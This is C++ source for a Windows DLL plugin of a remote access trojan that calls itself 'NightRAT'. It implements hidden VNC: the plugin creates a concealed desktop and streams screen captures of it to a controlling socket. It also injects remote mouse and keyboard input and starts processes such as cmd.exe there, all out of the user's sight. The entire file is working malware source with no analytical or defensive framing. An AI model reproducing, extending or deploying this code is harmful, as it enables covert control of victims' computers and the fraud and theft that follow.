#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <condition_variable>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 20;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Frame Queue for Producer-Consumer
struct FrameData {
    HBITMAP hBmp;
    int width;
    int height;
    int scale;
    int fps;
};
static queue<FrameData> g_frameQueue;
static mutex g_frameMutex;
static condition_variable g_frameCV;
static thread g_frameThread;
static atomic_bool g_frameRunning(false);

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static queue<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

// ---------- State ----------
static HWND  g_dragHwnd     = NULL;
static POINT g_dragStartPt  = {0, 0};
static RECT  g_dragStartRect = {0, 0, 0, 0};
static bool  g_dragging     = false;
static LRESULT g_dragHitTest = HTCLIENT;
static HWND  g_hLastWindow  = NULL;
static HWND  g_hCurrentFocus = NULL;

// -----------------------------------------------------------------------

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor  = 0;
    frameHeader.scale    = (uint32_t)scale;
    frameHeader.fps      = (uint32_t)fps;
    frameHeader.width    = (uint32_t)width;
    frameHeader.height   = (uint32_t)height;
    frameHeader.format   = FRAME_FORMAT_JPEG;
    frameHeader.dataSize = (uint32_t)jpegBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type      = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size      = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    CLSID clsid;
    if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;

    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;

    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid           = EncoderQuality;
    params.Parameter[0].Type           = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value          = &quality;

    if (bmp.Save(stream, &clsid, &params) == Ok) {
        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        bytes.resize((size_t)stat.cbSize.QuadPart);
        LARGE_INTEGER li = {0};
        stream->Seek(li, STREAM_SEEK_SET, NULL);
        ULONG read;
        stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    }
    stream->Release();
    return !bytes.empty();
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;
    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
}

// -----------------------------------------------------------------------
//  Frame Worker Thread (Consumer)
// -----------------------------------------------------------------------
static void frame_worker() {
    while (g_frameRunning) {
        FrameData data;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_frameQueue.empty() || !g_frameRunning; });
            if (!g_frameRunning && g_frameQueue.empty()) break;
            data = g_frameQueue.front();
            g_frameQueue.pop();
        }

        vector<unsigned char> jpeg;
        if (bitmap_to_jpeg(data.hBmp, (ULONG)data.scale, jpeg)) {
            safe_send_hvnc_frame(g_socket, data.scale, data.fps, data.width, data.height, jpeg);
        }
        DeleteObject(data.hBmp);
    }
    // Clean up queue
    lock_guard<mutex> lock(g_frameMutex);
    while(!g_frameQueue.empty()) {
        DeleteObject(g_frameQueue.front().hBmp);
        g_frameQueue.pop();
    }
}

// -----------------------------------------------------------------------
//  Dirty Check Helper: Compare small hash of the screen to skip static frames
// -----------------------------------------------------------------------
static uint64_t calculate_screen_hash(HDC hdc, int sw, int sh) {
    // We downsample to a tiny 8x8 image and calculate a simple sum hash
    // This is extremely fast and catches almost all visual changes
    static HDC hdcHash = NULL;
    static HBITMAP hbmpHash = NULL;
    if (!hdcHash) {
        hdcHash = CreateCompatibleDC(hdc);
        hbmpHash = CreateCompatibleBitmap(hdc, 8, 8);
        SelectObject(hdcHash, hbmpHash);
    }

    SetStretchBltMode(hdcHash, COLORONCOLOR);
    StretchBlt(hdcHash, 0, 0, 8, 8, hdc, 0, 0, sw, sh, SRCCOPY);

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = 8;
    bmi.bmiHeader.biHeight = 8;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    uint32_t pixels[64];
    GetDIBits(hdcHash, hbmpHash, 0, 8, pixels, &bmi, DIB_RGB_COLORS);

    uint64_t hash = 0;
    for (int i = 0; i < 64; ++i) hash += pixels[i];
    return hash;
}

// -----------------------------------------------------------------------
//  Capture Loop (Producer) - Maximum Optimization
// -----------------------------------------------------------------------
static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) { g_captureRunning = false; return; }
    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_captureRunning = false; return; }

    int sw = 0, sh = 0;
    HDC hdcScreen = NULL;
    HDC hdcMem = NULL;
    HBITMAP hbmpMem = NULL;
    HGDIOBJ hOldMem = NULL;
    HDC hdcWin = NULL;
    HDC hdcFinal = NULL;

    uint64_t lastHash = 0;
    int forceFrameCounter = 0;

    while (g_captureRunning) {
        DWORD start = GetTickCount();

        int curSw = GetSystemMetrics(SM_CXSCREEN);
        int curSh = GetSystemMetrics(SM_CYSCREEN);

        if (curSw != sw || curSh != sh) {
            sw = curSw; sh = curSh;
            if (hOldMem) SelectObject(hdcMem, hOldMem);
            if (hbmpMem) DeleteObject(hbmpMem);
            if (hdcMem) DeleteDC(hdcMem);
            if (hdcWin) DeleteDC(hdcWin);
            if (hdcFinal) DeleteDC(hdcFinal);
            if (hdcScreen) ReleaseDC(NULL, hdcScreen);

            hdcScreen = GetDC(NULL);
            hdcMem = CreateCompatibleDC(hdcScreen);
            hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
            hOldMem = SelectObject(hdcMem, hbmpMem);
            hdcWin = CreateCompatibleDC(hdcScreen);
            hdcFinal = CreateCompatibleDC(hdcScreen);
        }

        int scale, fps;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            fps   = g_targetFps;
        }

        // Optimized Compositing: Only BitBlt windows
        // Background is already black or handled by the first window
        RECT fullRect = { 0, 0, sw, sh };
        FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

        HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
        vector<HWND> windows;
        while (hwnd) {
            if (IsWindowVisible(hwnd)) windows.push_back(hwnd);
            hwnd = GetWindow(hwnd, GW_HWNDNEXT);
        }
        reverse(windows.begin(), windows.end());

        for (HWND h : windows) {
            RECT rect;
            if (!GetWindowRect(h, &rect)) continue;
            int ww = rect.right - rect.left;
            int wh = rect.bottom - rect.top;
            if (ww <= 0 || wh <= 0) continue;

            HDC hdcWinSrc = GetWindowDC(h);
            if (hdcWinSrc) {
                BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWinSrc, 0, 0, SRCCOPY);
                ReleaseDC(h, hdcWinSrc);
            } else {
                if (PrintWindow(h, hdcWin, PW_RENDERFULLCONTENT)) {
                    BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
                }
            }
        }

        // Dirty Check
        uint64_t currentHash = calculate_screen_hash(hdcMem, sw, sh);
        bool hashChanged = (currentHash != lastHash);
        lastHash = currentHash;

        // Send frame if changed, or every ~2 seconds (force update)
        if (hashChanged || ++forceFrameCounter >= (fps * 2)) {
            forceFrameCounter = 0;

            int dw = (sw * scale) / 100;
            int dh = (sh * scale) / 100;
            if (dw < 1) dw = 1; if (dh < 1) dh = 1;

            HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
            HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);
            SetStretchBltMode(hdcFinal, COLORONCOLOR);
            StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
            SelectObject(hdcFinal, hOldFinal);

            lock_guard<mutex> lock(g_frameMutex);
            if (g_frameQueue.size() < 2) {
                g_frameQueue.push({hbmpFinal, dw, dh, scale, fps});
                g_frameCV.notify_one();
            } else {
                DeleteObject(hbmpFinal);
            }
        }

        DWORD elapsed  = GetTickCount() - start;
        DWORD interval = 1000 / (fps > 0 ? fps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }

    if (hOldMem) SelectObject(hdcMem, hOldMem);
    if (hbmpMem) DeleteObject(hbmpMem);
    if (hdcMem) DeleteDC(hdcMem);
    if (hdcWin) DeleteDC(hdcWin);
    if (hdcFinal) DeleteDC(hdcFinal);
    if (hdcScreen) ReleaseDC(NULL, hdcScreen);
}

// -----------------------------------------------------------------------
//  Mouse and Keyboard Helpers
// -----------------------------------------------------------------------
static POINT screen_pt(int normX, int normY) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    POINT pt;
    pt.x = (normX * sw) / 65535;
    pt.y = (normY * sh) / 65535;
    return pt;
}

static HWND GetFocusedWindow() {
    HWND hTarget = g_hCurrentFocus;
    if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
    if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
    if (!hTarget || !IsWindow(hTarget)) return NULL;

    DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
    if (GetGUIThreadInfo(threadId, &gti)) {
        if (gti.hwndFocus) return gti.hwndFocus;
        if (gti.hwndCaret) return gti.hwndCaret;
    }
    return hTarget;
}

static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning && g_inputQueue.empty()) break;
            task = g_inputQueue.front();
            g_inputQueue.pop();
        }

        const string& action = task.action;
        const json&   cmd    = task.cmd;

        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            int vk = cmd.value("keycode", 0);
            HWND hTarget = g_hCurrentFocus;
            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
            if (!hTarget || !IsWindow(hTarget)) continue;

            if (action == "hvnc_keydown") PostMessageW(hTarget, WM_KEYDOWN, vk, 0x00000001);
            else if (action == "hvnc_keyup") PostMessageW(hTarget, WM_KEYUP, vk, 0xC0000001);
            else if (action == "hvnc_char") PostMessageW(hTarget, WM_CHAR, vk, 0x00000001);
            continue;
        }

        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;

        int normX = cmd.value("x", 0);
        int normY = cmd.value("y", 0);
        POINT screenPt = screen_pt(normX, normY);

        if (action == "hvnc_mousemove") {
            if (g_dragging && g_dragHwnd) {
                int dx = screenPt.x - g_dragStartPt.x;
                int dy = screenPt.y - g_dragStartPt.y;
                if (g_dragHitTest == HTCAPTION) {
                    SetWindowPos(g_dragHwnd, NULL, g_dragStartRect.left + dx, g_dragStartRect.top + dy, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                } else {
                    RECT rc = g_dragStartRect;
                    int w = rc.right - rc.left;
                    int h = rc.bottom - rc.top;
                    switch (g_dragHitTest) {
                        case HTRIGHT: w += dx; break; case HTBOTTOM: h += dy; break;
                        case HTBOTTOMRIGHT: w += dx; h += dy; break;
                        case HTLEFT: rc.left += dx; w -= dx; break;
                        case HTTOP: rc.top += dy; h -= dy; break;
                        case HTTOPLEFT: rc.left += dx; w -= dx; rc.top += dy; h -= dy; break;
                        case HTTOPRIGHT: w += dx; rc.top += dy; h -= dy; break;
                        case HTBOTTOMLEFT: rc.left += dx; w -= dx; h += dy; break;
                    }
                    if (w < 100) w = 100; if (h < 50) h = 50;
                    SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h, SWP_NOZORDER | SWP_NOACTIVATE);
                }
                PostMessageW(g_dragHwnd, WM_NCMOUSEMOVE, (WPARAM)g_dragHitTest, MAKELPARAM(screenPt.x, screenPt.y));
            } else {
                HWND hwnd = WindowFromPoint(screenPt);
                if (hwnd) {
                    LRESULT ht = HTCLIENT;
                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
                        if (ht == HTCLIENT) {
                            POINT clientPt = screenPt; ScreenToClient(hwnd, &clientPt);
                            PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
                        } else PostMessageW(hwnd, WM_NCMOUSEMOVE, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
                        SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE), SMTO_ABORTIFHUNG, 200, NULL);
                    }
                }
            }
            continue;
        }

        if (action == "hvnc_mousedown") {
            int btn = cmd.value("button", 0);
            HWND hwnd = WindowFromPoint(screenPt);
            if (!hwnd) continue;
            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
            g_hLastWindow = hRoot;
            LRESULT ht = HTCLIENT;
            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
            HWND hFore = GetForegroundWindow();
            if (hFore != hRoot) {
                DWORD foreThreadId = GetWindowThreadProcessId(hFore, NULL);
                DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
                DWORD currentThreadId = GetCurrentThreadId();
                if (foreThreadId != targetThreadId) {
                    AttachThreadInput(targetThreadId, foreThreadId, TRUE);
                    AttachThreadInput(currentThreadId, targetThreadId, TRUE);
                    AllowSetForegroundWindow(ASFW_ANY);
                    SetForegroundWindow(hRoot); SetActiveWindow(hRoot); SetFocus(hRoot);
                    AttachThreadInput(currentThreadId, targetThreadId, FALSE);
                    AttachThreadInput(targetThreadId, foreThreadId, FALSE);
                } else SetForegroundWindow(hRoot);
                UINT mouseMsg = (btn == 0 ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN));
                PostMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, mouseMsg));
                PostMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
            }
            PostMessageW(hwnd, WM_SETFOCUS, 0, 0); g_hCurrentFocus = hwnd;
            SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
            if (ht != HTCLIENT) {
                if (btn == 0) {
                    if (ht == HTCLOSE) PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0);
                    else if (ht == HTMINBUTTON) PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    else if (ht == HTMAXBUTTON) {
                        WINDOWPLACEMENT wp = { sizeof(wp) }; GetWindowPlacement(hRoot, &wp);
                        if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
                        else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                    }
                }
                UINT ncMsg = (btn == 1) ? WM_NCRBUTTONDOWN : (btn == 2 ? WM_NCMBUTTONDOWN : WM_NCLBUTTONDOWN);
                PostMessageW(hwnd, ncMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
                if (btn == 0 && (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM || ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT)) {
                    g_dragging = true; g_dragHwnd = hRoot; g_dragStartPt = screenPt; g_dragHitTest = ht; GetWindowRect(hRoot, &g_dragStartRect);
                }
            } else {
                HWND hTarget = hwnd; HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                if (hChild && hChild != hwnd) hTarget = hChild;
                g_hCurrentFocus = hTarget; POINT clientPt = screenPt; ScreenToClient(hTarget, &clientPt);
                UINT msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
                WPARAM wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
                PostMessageW(hTarget, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
            }
            continue;
        }

        if (action == "hvnc_mouseup") {
            int btn = cmd.value("button", 0);
            if (btn == 0 && g_dragging) { g_dragging = false; g_dragHwnd = NULL; }
            HWND hwnd = WindowFromPoint(screenPt); if (!hwnd) continue;
            LRESULT ht = HTCLIENT; SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
            if (ht != HTCLIENT) {
                UINT ncMsg = (btn == 1) ? WM_NCRBUTTONUP : (btn == 2 ? WM_NCMBUTTONUP : WM_NCLBUTTONUP);
                PostMessageW(hwnd, ncMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
            } else {
                HWND hTarget = hwnd; HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                if (hChild && hChild != hwnd) hTarget = hChild;
                POINT clientPt = screenPt; ScreenToClient(hTarget, &clientPt);
                UINT msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
                PostMessageW(hTarget, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
            }
            continue;
        }

        if (action == "hvnc_doubleclick") {
            int btn = cmd.value("button", 0); HWND hwnd = WindowFromPoint(screenPt); if (!hwnd) continue;
            SendMessageW(hwnd, WM_MOUSEACTIVATE, (WPARAM)hwnd, MAKELPARAM(HTCLIENT, WM_LBUTTONDBLCLK));
            SetForegroundWindow(hwnd); SetFocus(hwnd); SendMessageW(hwnd, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hwnd);
            LRESULT ht = HTCLIENT; SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y), SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
            if (ht == HTCLIENT) {
                HWND hTarget = hwnd; HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                if (hChild && hChild != hwnd) hTarget = hChild;
                POINT clientPt = screenPt; ScreenToClient(hTarget, &clientPt);
                UINT msg = (btn == 0) ? WM_LBUTTONDBLCLK : (btn == 1 ? WM_RBUTTONDBLCLK : WM_MBUTTONDBLCLK);
                PostMessageW(hTarget, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
            }
            continue;
        }
    }
}

static wstring utf8_to_wstring(const string& str) {
    if (str.empty()) return wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return wstring();
    wstring res(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) { g_socket = sock; }

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json cmd = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (!g_frameRunning.exchange(true)) { if (g_frameThread.joinable()) g_frameThread.join(); g_frameThread = thread(frame_worker); }
            if (!g_captureRunning.exchange(true)) { if (g_captureThread.joinable()) g_captureThread.join(); g_captureThread = thread(capture_loop); }
            if (!g_inputRunning.exchange(true)) { if (g_inputThread.joinable()) g_inputThread.join(); g_inputThread = thread(input_loop); }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false; g_frameRunning = false; g_inputRunning = false;
            g_frameCV.notify_all(); g_inputCV.notify_all();
            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_frameThread.joinable()) g_frameThread.join();
            if (g_inputThread.joinable()) g_inputThread.join();
            g_dragging = false; g_dragHwnd = NULL;
        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
        } else if (action == "hvnc_run") {
            ensure_desktop(); if (!g_hHiddenDesktop) return;
            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
            vector<wchar_t> cmdLine(path.begin(), path.end()); cmdLine.push_back(L'\0');
            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
            STARTUPINFOW si = { sizeof(si) }; si.lpDesktop = (LPWSTR)fullDesktopName.c_str(); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_SHOW;
            PROCESS_INFORMATION pi = { 0 };
            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                send_status("Process started on hidden desktop");
            } else send_error("Failed to start process. Error: " + to_string(GetLastError()));
        } else if (action.find("hvnc_mouse") != string::npos || action.find("hvnc_key") != string::npos || action == "hvnc_char" || action == "hvnc_doubleclick") {
            lock_guard<mutex> lock(g_inputMutex); g_inputQueue.push({action, cmd}); g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) { g_captureRunning = false; g_frameRunning = false; g_inputRunning = false; g_frameCV.notify_all(); g_inputCV.notify_all(); }
    return TRUE;
}
